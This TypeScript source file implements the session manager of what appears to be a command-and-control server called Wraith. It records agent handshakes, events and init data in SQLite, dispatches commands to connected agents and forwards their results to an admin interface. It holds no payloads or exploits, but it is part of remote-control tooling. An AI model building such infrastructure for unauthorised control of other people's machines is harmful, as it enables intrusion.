import { getDb } from '../db/index.js'
import type Database from 'better-sqlite3'
import type { ModuleRegistry } from '../modules/registry.js'
import type {
  Session,
  SessionMeta,
  AgentMessage,
  C2Transport,
  AdminMessage,
  StoredEvent,
  StoredInitData,
  LiveEvent,
} from '@wraith/types'

type AdminBroadcast = (msg: AdminMessage) => void

export class SessionManager {
  // Only contains sessions that have completed handshake
  private activeSessions  = new Set<string>()
  // sessionId → moduleId → live state (in-memory, rebuilt from WS events)
  private liveState       = new Map<string, Map<string, Record<string, unknown>>>()
  // sessionId → Session — avoids DB round-trips in hot paths (e.g. onEvent lifecycle hooks)
  private sessionCache    = new Map<string, Session>()
  // execId → { moduleId, commandDefId } — needed to populate command_result broadcasts
  private pendingCommands = new Map<string, { moduleId: string; commandDefId: string }>()

  // Pre-compiled statements — avoids re-parsing SQL on every high-frequency event
  private readonly stmt: {
    upsertSession:     Database.Statement
    updateSessionDead: Database.Statement
    updateSessionSeen: Database.Statement
    insertEvent:       Database.Statement
    upsertInitData:    Database.Statement
    updateCommand:     Database.Statement
    insertCommand:     Database.Statement
    selectSession:     Database.Statement
    selectEvents:      Database.Statement
    selectInitData:    Database.Statement
    selectPendingCmds: Database.Statement
  }

  constructor(
    private transport:      C2Transport,
    private broadcastAdmin: AdminBroadcast,
    private registry:       ModuleRegistry,
  ) {
    const db = getDb()
    this.stmt = {
      upsertSession:     db.prepare(`INSERT OR REPLACE INTO sessions (id, created_at, last_seen_at, meta, status) VALUES (?, ?, ?, ?, 'active')`),
      updateSessionDead: db.prepare(`UPDATE sessions SET status = 'dead' WHERE id = ?`),
      updateSessionSeen: db.prepare(`UPDATE sessions SET last_seen_at = ? WHERE id = ?`),
      insertEvent:       db.prepare(`INSERT INTO events (session_id, module_id, type, payload, timestamp, persist) VALUES (?, ?, ?, ?, ?, 1)`),
      upsertInitData:    db.prepare(`INSERT OR REPLACE INTO init_data (session_id, module_id, key, value) VALUES (?, ?, ?, ?)`),
      updateCommand:     db.prepare(`UPDATE commands SET status = ?, result = ?, error = ?, completed_at = ? WHERE id = ?`),
      insertCommand:     db.prepare(`INSERT INTO commands (id, session_id, module_id, command_id, params, created_at) VALUES (?, ?, ?, ?, ?, ?)`),
      selectSession:     db.prepare(`SELECT id, meta, status, last_seen_at FROM sessions WHERE id = ?`),
      selectEvents:      db.prepare(`SELECT module_id, type, payload, timestamp, persist FROM events WHERE session_id = ? ORDER BY timestamp ASC`),
      selectInitData:    db.prepare(`SELECT module_id, key, value FROM init_data WHERE session_id = ?`),
      selectPendingCmds: db.prepare(`SELECT id FROM commands WHERE session_id = ? AND status = 'pending'`),
    }

    // Any sessions left active from a previous server run are now unreachable — mark them dead
    db.prepare(`UPDATE sessions SET status = 'dead' WHERE status = 'active'`).run()

    // No onAgentConnect registration — activeSessions is populated only after successful handshake
    transport.onAgentDisconnect(id => this.onDisconnect(id))
    transport.onAgentMessage((id, msg) => this.onMessage(id, msg))
  }

  // ─── Connection lifecycle ─────────────────────────────────────────────────

  private onDisconnect(connectionId: string): void {
    const sessionId = connectionId
    if (!this.activeSessions.has(sessionId)) return

    this.activeSessions.delete(sessionId)
    this.liveState.delete(sessionId)

    this.stmt.updateSessionDead.run(sessionId)

    // Clear pending command entries — agent won't reply now
    const pending = this.stmt.selectPendingCmds.all(sessionId) as Array<{ id: string }>
    pending.forEach(r => this.pendingCommands.delete(r.id))

    this.broadcastAdmin({ type: 'session_dead', sessionId })

    const cached = this.sessionCache.get(sessionId)
    if (cached) {
      const dead = { ...cached, status: 'dead' as const }
      this.registry.all().forEach(mod => mod.lifecycle?.onSessionEnd?.(dead))
    }
    this.sessionCache.delete(sessionId)
  }

  // ─── Message dispatch ─────────────────────────────────────────────────────

  private onMessage(connectionId: string, msg: AgentMessage): void {
    const sessionId = connectionId

    if (msg.type === 'ping') {
      const now = Date.now()
      this.transport.send(connectionId, { type: 'pong' })
      this.stmt.updateSessionSeen.run(now, sessionId)
      this.broadcastAdmin({ type: 'session_seen', sessionId, lastSeenAt: now })
      return
    }

    if (msg.type === 'handshake') { this.handleHandshake(connectionId, msg.meta); return }
    if (msg.type === 'event')     { this.handleEvent(sessionId, msg);               return }
    if (msg.type === 'init_data') { this.handleInitData(sessionId, msg);            return }
    if (msg.type === 'command_result') { this.handleCommandResult(sessionId, msg);  return }
  }

  // ─── Message handlers ─────────────────────────────────────────────────────

  private handleHandshake(connectionId: string, meta: SessionMeta): void {
    if (this.activeSessions.has(connectionId)) return
    const sessionId = connectionId
    const now = Date.now()

    this.stmt.upsertSession.run(sessionId, now, now, JSON.stringify(meta))

    // Only add to activeSessions after a successful handshake
    this.activeSessions.add(sessionId)
    this.liveState.set(sessionId, new Map())

    const session: Session = { id: sessionId, meta, status: 'active', lastSeenAt: now }
    this.sessionCache.set(sessionId, session)

    this.transport.send(connectionId, { type: 'session_ack', sessionId })
    this.transport.send(connectionId, { type: 'module_configs', modules: this.registry.allSerialized() })

    this.broadcastAdmin({ type: 'session_new', session })
    this.registry.all().forEach(mod => mod.lifecycle?.onSessionStart?.(session))
  }

  private handleEvent(sessionId: string, msg: AgentMessage & { type: 'event' }): void {
    if (msg.persist) {
      this.stmt.insertEvent.run(sessionId, msg.moduleId, msg.eventType, JSON.stringify(msg.payload), msg.timestamp)
    }

    const mod = this.registry.get(msg.moduleId)
    if (mod) {
      const sessionState = this.liveState.get(sessionId) ?? new Map()
      const liveEvent: LiveEvent = {
        type: msg.eventType, payload: msg.payload,
        moduleId: msg.moduleId, sessionId, timestamp: msg.timestamp,
      }
      sessionState.set(msg.moduleId, mod.live(sessionState.get(msg.moduleId), liveEvent))
      this.liveState.set(sessionId, sessionState)

      const oe = mod.lifecycle?.onEvent
      if (oe && oe.types.has(msg.eventType)) {
        const stored: StoredEvent = {
          moduleId: msg.moduleId, type: msg.eventType,
          payload: msg.payload, timestamp: msg.timestamp, persist: msg.persist,
        }
        const session = this.sessionCache.get(sessionId)
        if (session) oe.handler(stored, session)
      }
    }

    this.broadcastAdmin({
      type: 'event', sessionId,
      moduleId: msg.moduleId, eventType: msg.eventType,
      payload: msg.payload, timestamp: msg.timestamp, persist: msg.persist,
    })
  }

  private handleInitData(sessionId: string, msg: AgentMessage & { type: 'init_data' }): void {
    if (msg.persist) {
      this.stmt.upsertInitData.run(sessionId, msg.moduleId, msg.key, JSON.stringify(msg.value))
    }
    this.broadcastAdmin({ type: 'init_data', sessionId, moduleId: msg.moduleId, key: msg.key, value: msg.value })
  }

  private handleCommandResult(sessionId: string, msg: AgentMessage & { type: 'command_result' }): void {
    const meta = this.pendingCommands.get(msg.commandId)
    this.pendingCommands.delete(msg.commandId)

    this.stmt.updateCommand.run(
      msg.error ? 'error' : 'done',
      msg.result !== undefined ? JSON.stringify(msg.result) : null,
      msg.error ?? null,
      Date.now(),
      msg.commandId,
    )

    this.broadcastAdmin({
      type: 'command_result', sessionId,
      commandId:    msg.commandId,
      moduleId:     meta?.moduleId     ?? '',
      commandDefId: meta?.commandDefId ?? '',
      result: msg.result, error: msg.error,
    })
  }

  // ─── Public API ───────────────────────────────────────────────────────────

  getSession(sessionId: string): Session | null {
    const cached = this.sessionCache.get(sessionId)
    if (cached) return cached

    const row = this.stmt.selectSession.get(sessionId) as
      { id: string; meta: string; status: string; last_seen_at: number } | undefined
    if (!row) return null
    return {
      id:         row.id,
      meta:       JSON.parse(row.meta),
      status:     row.status as 'active' | 'dead',
      lastSeenAt: row.last_seen_at,
    }
  }

  getLiveState(sessionId: string, moduleId: string): Record<string, unknown> {
    return this.liveState.get(sessionId)?.get(moduleId) ?? {}
  }

  getEvents(sessionId: string): StoredEvent[] {
    const rows = this.stmt.selectEvents.all(sessionId) as
      Array<{ module_id: string; type: string; payload: string; timestamp: number; persist: number }>
    return rows.map(r => ({
      moduleId:  r.module_id,
      type:      r.type,
      payload:   JSON.parse(r.payload),
      timestamp: r.timestamp,
      persist:   r.persist === 1,
    }))
  }

  getInitData(sessionId: string): StoredInitData[] {
    const rows = this.stmt.selectInitData.all(sessionId) as
      Array<{ module_id: string; key: string; value: string }>
    return rows.map(r => ({ moduleId: r.module_id, key: r.key, value: JSON.parse(r.value) }))
  }

  sendCommand(
    connectionId: string,
    sessionId: string,
    execId: string,
    moduleId: string,
    commandId: string,
    params: Record<string, unknown>,
  ): void {
    this.stmt.insertCommand.run(execId, sessionId, moduleId, commandId, JSON.stringify(params), Date.now())
    this.pendingCommands.set(execId, { moduleId, commandDefId: commandId })
    this.transport.send(connectionId, { type: 'command', commandId: execId, moduleId, commandDef: commandId, params })
  }

  // connectionId === sessionId, but keeping a named method preserves the abstraction
  getConnectionId(sessionId: string): string | undefined {
    return this.activeSessions.has(sessionId) ? sessionId : undefined
  }
}
